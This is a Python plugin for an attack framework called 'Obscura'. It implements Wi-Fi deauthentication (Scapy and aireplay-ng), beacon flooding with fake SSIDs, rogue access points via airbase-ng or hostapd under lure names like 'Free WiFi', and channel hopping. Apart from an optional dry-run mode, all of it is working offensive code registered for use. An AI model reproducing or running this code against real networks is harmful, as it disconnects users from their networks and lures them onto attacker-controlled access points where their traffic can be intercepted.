"""
Wi-Fi Attack Plugin for Obscura
Implements professional-grade Wi-Fi exploitation techniques including:
- Deauthentication attacks (aireplay-ng and Scapy)
- Beacon flooding
- Rogue AP deployment (airbase-ng/hostapd)
- Channel hopping (2.4GHz and 5GHz)
- PHY auto-selection
"""

import os
import sys
import subprocess
import threading
import time
import random
import string
from typing import List, Dict, Any, Optional
from scapy.all import (
    Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth,
    sendp, Packet, conf
)

try:
    from ..hardware import get_hardware_profile, get_preferred_wifi_interface
except ImportError:
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
    from hardware import get_hardware_profile, get_preferred_wifi_interface

CHANNELS_2_4GHZ = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
CHANNELS_5GHZ = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112,
                 116, 120, 124, 128, 132, 136, 140, 144, 149, 153,
                 157, 161, 165]

COMMON_SSIDS = [
    "Free WiFi", "Guest Network", "NETGEAR", "TP-LINK", "Linksys",
    "Google Starbucks", "attwifi", "xfinitywifi", "Airport WiFi"
]


def check_tool_availability(tool_name: str) -> bool:
    """Check if a command-line tool is available."""
    try:
        result = subprocess.run(['which', tool_name], 
                              capture_output=True, 
                              text=True,
                              timeout=5)
        return result.returncode == 0
    except Exception:
        return False


def get_phy_for_interface(interface: str) -> Optional[str]:
    """Get the PHY device for a wireless interface."""
    try:
        result = subprocess.run(
            ['iw', 'dev', interface, 'info'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        for line in result.stdout.splitlines():
            if 'wiphy' in line.lower():
                phy_num = line.split()[-1]
                return f"phy{phy_num}"
        
        result = subprocess.run(['iw', 'list'], 
                              capture_output=True, 
                              text=True,
                              timeout=10)
        lines = result.stdout.splitlines()
        for i, line in enumerate(lines):
            if interface in line:
                for j in range(max(0, i-10), i):
                    if 'Wiphy' in lines[j]:
                        return lines[j].split()[1]
        return None
        
    except Exception as e:
        return None


def get_supported_bands(interface: str) -> Dict[str, bool]:
    """Detect which bands (2.4GHz, 5GHz) are supported by interface."""
    bands = {'2.4GHz': False, '5GHz': False}
    
    try:
        result = subprocess.run(
            ['iw', 'phy'],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        in_freq_section = False
        for line in result.stdout.splitlines():
            if 'Frequencies:' in line:
                in_freq_section = True
                continue
            
            if in_freq_section:
                if 'MHz' in line:
                    try:
                        freq = int(line.split('MHz')[0].strip().split()[-1])
                        if 2400 <= freq <= 2500:
                            bands['2.4GHz'] = True
                        elif 5000 <= freq <= 6000:
                            bands['5GHz'] = True
                    except (ValueError, IndexError):
                        pass
                elif line.strip() and not line.startswith('\t\t'):
                    in_freq_section = False
        
        if not any(bands.values()):
            bands['2.4GHz'] = True
            
    except Exception as e:
        bands['2.4GHz'] = True
    
    return bands


def select_channels_for_interface(interface: str) -> List[int]:
    """Auto-select channels based on interface capabilities."""
    bands = get_supported_bands(interface)
    channels = []
    
    if bands['2.4GHz']:
        channels.extend(CHANNELS_2_4GHZ[:11])
    
    if bands['5GHz']:
        channels.extend(CHANNELS_5GHZ[:8])
    
    if not channels:
        channels = [1, 6, 11]
    
    return channels


def wifi_deauth_scapy(
    self,
    target_bssid: str,
    client_mac: Optional[str] = None,
    count: int = 100,
    interface: Optional[str] = None
) -> bool:
    """
    Perform Wi-Fi deauthentication attack using Scapy.
    
    Args:
        target_bssid: Target AP BSSID (MAC address)
        client_mac: Specific client to deauth (None = broadcast)
        count: Number of deauth packets to send
        interface: Wireless interface (uses self.interface if None)
    
    Returns:
        bool: True if attack executed successfully
    """
    iface = interface or getattr(self, 'interface', 'wlan0mon')
    client = client_mac or "FF:FF:FF:FF:FF:FF"
    
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] Wi-Fi Deauth (Scapy): Target={target_bssid}, "
                  f"Client={client}, Count={count}, Interface={iface}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    try:
        dot11 = Dot11(addr1=client, addr2=target_bssid, addr3=target_bssid)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
        
        log_msg = f"[Wi-Fi Deauth] Sending {count} deauth packets to {target_bssid}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        sendp(packet, iface=iface, count=count, inter=0.1, verbose=False)
        
        success_msg = f"[Wi-Fi Deauth] Successfully sent {count} deauth packets"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[Wi-Fi Deauth] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def wifi_deauth_aireplay(
    self,
    target_bssid: str,
    client_mac: Optional[str] = None,
    count: int = 0,
    interface: Optional[str] = None
) -> bool:
    """
    Perform Wi-Fi deauthentication attack using aireplay-ng.
    
    Args:
        target_bssid: Target AP BSSID (MAC address)
        client_mac: Specific client to deauth (None = broadcast)
        count: Number of deauth packets (0 = continuous)
        interface: Wireless interface (uses self.interface if None)
    
    Returns:
        bool: True if attack executed successfully
    """
    iface = interface or getattr(self, 'interface', 'wlan0mon')
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] Wi-Fi Deauth (aireplay-ng): Target={target_bssid}, "
                  f"Client={client_mac or 'broadcast'}, Count={count}, Interface={iface}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not check_tool_availability('aireplay-ng'):
        fallback_msg = "[Wi-Fi Deauth] aireplay-ng not found, falling back to Scapy"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(fallback_msg)
        print(fallback_msg)
        return wifi_deauth_scapy(self, target_bssid, client_mac, 
                                count if count > 0 else 100, interface)
    
    try:
        cmd = ['aireplay-ng', '--deauth', str(count), '-a', target_bssid]
        
        if client_mac:
            cmd.extend(['-c', client_mac])
        
        cmd.append(iface)
        
        log_msg = f"[Wi-Fi Deauth] Executing: {' '.join(cmd)}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if hasattr(self, 'active_attacks'):
            self.active_attacks.append(proc)
        
        if count > 0:
            proc.wait(timeout=30)
        else:
            time.sleep(10)
        
        success_msg = f"[Wi-Fi Deauth] Attack initiated against {target_bssid}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[Wi-Fi Deauth] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def wifi_beacon_flood(
    self,
    count: int = 100,
    channel: int = 6,
    interface: Optional[str] = None,
    ssid_list: Optional[List[str]] = None
) -> bool:
    """
    Flood airspace with fake beacon frames.
    
    Args:
        count: Number of fake SSIDs to broadcast
        channel: Wi-Fi channel to use
        interface: Wireless interface (uses self.interface if None)
        ssid_list: Custom SSID list (uses common SSIDs if None)
    
    Returns:
        bool: True if attack executed successfully
    """
    iface = interface or getattr(self, 'interface', 'wlan0mon')
    ssids = ssid_list or COMMON_SSIDS
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] Wi-Fi Beacon Flood: Count={count}, "
                  f"Channel={channel}, Interface={iface}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    try:
        try:
            subprocess.run(['iw', 'dev', iface, 'set', 'channel', str(channel)],
                         capture_output=True,
                         timeout=5)
        except Exception:
            pass
        
        log_msg = f"[Beacon Flood] Flooding channel {channel} with {count} fake beacons"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        for i in range(count):
            ssid = random.choice(ssids)
            if random.random() < 0.3:
                ssid = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 20)))
            
            bssid = ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])
            
            dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                         addr2=bssid, addr3=bssid)
            
            beacon = Dot11Beacon(cap='ESS+privacy')
            
            essid = Dot11Elt(ID='SSID', info=ssid.encode(), len=len(ssid))
            rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
            ds_set = Dot11Elt(ID='DSset', info=bytes([channel]))
            
            frame = RadioTap() / dot11 / beacon / essid / rates / ds_set
            
            try:
                sendp(frame, iface=iface, verbose=False)
            except Exception:
                pass
            
            if i % 20 == 0 and i > 0:
                time.sleep(0.1)
        
        success_msg = f"[Beacon Flood] Sent {count} fake beacon frames"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[Beacon Flood] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def wifi_rogue_ap(
    self,
    ssid: str = "Free WiFi",
    channel: int = 6,
    interface: Optional[str] = None,
    duration: int = 300
) -> bool:
    """
    Deploy a rogue access point using airbase-ng or hostapd.
    
    Args:
        ssid: SSID for rogue AP
        channel: Wi-Fi channel
        interface: Wireless interface (uses self.interface if None)
        duration: Duration in seconds to run AP
    
    Returns:
        bool: True if attack executed successfully
    """
    iface = interface or getattr(self, 'interface', 'wlan0mon')
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] Rogue AP: SSID={ssid}, Channel={channel}, "
                  f"Interface={iface}, Duration={duration}s")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    has_airbase = check_tool_availability('airbase-ng')
    has_hostapd = check_tool_availability('hostapd')
    
    if not has_airbase and not has_hostapd:
        error_msg = "[Rogue AP] Neither airbase-ng nor hostapd found"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    if has_airbase:
        return _rogue_ap_airbase(self, ssid, channel, iface, duration)
    else:
        return _rogue_ap_hostapd(self, ssid, channel, iface, duration)


def _rogue_ap_airbase(
    self,
    ssid: str,
    channel: int,
    interface: str,
    duration: int
) -> bool:
    """Deploy rogue AP using airbase-ng."""
    try:
        cmd = [
            'airbase-ng',
            '-e', ssid,
            '-c', str(channel),
            interface
        ]
        
        log_msg = f"[Rogue AP] Starting airbase-ng: SSID={ssid}, Channel={channel}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if hasattr(self, 'active_attacks'):
            self.active_attacks.append(proc)
        
        def terminate_ap():
            time.sleep(duration)
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        
        threading.Thread(target=terminate_ap, daemon=True).start()
        
        success_msg = f"[Rogue AP] airbase-ng started, will run for {duration}s"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[Rogue AP] airbase-ng error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def _rogue_ap_hostapd(
    self,
    ssid: str,
    channel: int,
    interface: str,
    duration: int
) -> bool:
    """Deploy rogue AP using hostapd."""
    try:
        config_path = '/tmp/obscura_hostapd.conf'
        
        config_content = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
        
        with open(config_path, 'w') as f:
            f.write(config_content)
        
        log_msg = f"[Rogue AP] Starting hostapd: SSID={ssid}, Channel={channel}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        proc = subprocess.Popen(
            ['hostapd', config_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if hasattr(self, 'active_attacks'):
            self.active_attacks.append(proc)
        
        def terminate_ap():
            time.sleep(duration)
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
            try:
                os.remove(config_path)
            except Exception:
                pass
        
        threading.Thread(target=terminate_ap, daemon=True).start()
        
        success_msg = f"[Rogue AP] hostapd started, will run for {duration}s"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[Rogue AP] hostapd error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def wifi_channel_hop(
    self,
    interface: Optional[str] = None,
    duration: int = 60,
    hop_interval: float = 2.0,
    band: str = 'auto'
) -> bool:
    """
    Perform channel hopping across 2.4GHz and/or 5GHz bands.
    
    Args:
        interface: Wireless interface (uses self.interface if None)
        duration: Duration in seconds to hop channels
        hop_interval: Time in seconds between channel switches
        band: 'auto', '2.4', '5', or 'both'
    
    Returns:
        bool: True if attack executed successfully
    """
    iface = interface or getattr(self, 'interface', 'wlan0mon')
    simulate = getattr(self, 'simulate_mode', False)
    
    if band == 'auto':
        channels = select_channels_for_interface(iface)
    elif band == '2.4':
        channels = CHANNELS_2_4GHZ[:11]
    elif band == '5':
        channels = CHANNELS_5GHZ[:8]
    elif band == 'both':
        channels = CHANNELS_2_4GHZ[:11] + CHANNELS_5GHZ[:8]
    else:
        channels = select_channels_for_interface(iface)
    
    if simulate:
        log_msg = (f"[DRY RUN] Channel Hopping: Interface={iface}, "
                  f"Channels={channels}, Duration={duration}s, Interval={hop_interval}s")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    try:
        log_msg = f"[Channel Hop] Starting on {iface} with channels: {channels}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        start_time = time.time()
        channel_index = 0
        
        while time.time() - start_time < duration:
            channel = channels[channel_index % len(channels)]
            
            try:
                subprocess.run(
                    ['iw', 'dev', iface, 'set', 'channel', str(channel)],
                    capture_output=True,
                    timeout=5
                )
                
                hop_msg = f"[Channel Hop] Switched to channel {channel}"
                if hasattr(self, 'attack_log'):
                    self.attack_log.append(hop_msg)
                print(hop_msg)
                
            except Exception as e:
                error_msg = f"[Channel Hop] Failed to set channel {channel}: {e}"
                print(error_msg)
            
            channel_index += 1
            time.sleep(hop_interval)
        
        success_msg = f"[Channel Hop] Completed {channel_index} channel switches in {duration}s"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[Channel Hop] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def register(orchestrator):
    """
    Register Wi-Fi attack vectors with the orchestrator.
    
    This function is called automatically when the plugin is loaded.
    """
    orchestrator.register_attack('wifi_deauth_scapy', wifi_deauth_scapy)
    orchestrator.register_attack('wifi_deauth_aireplay', wifi_deauth_aireplay)
    orchestrator.register_attack('wifi_beacon_flood', wifi_beacon_flood)
    orchestrator.register_attack('wifi_rogue_ap', wifi_rogue_ap)
    orchestrator.register_attack('wifi_channel_hop', wifi_channel_hop)
    
    print("[+] Wi-Fi attack plugin loaded successfully")
    print("    - wifi_deauth_scapy")
    print("    - wifi_deauth_aireplay")
    print("    - wifi_beacon_flood")
    print("    - wifi_rogue_ap")
    print("    - wifi_channel_hop")
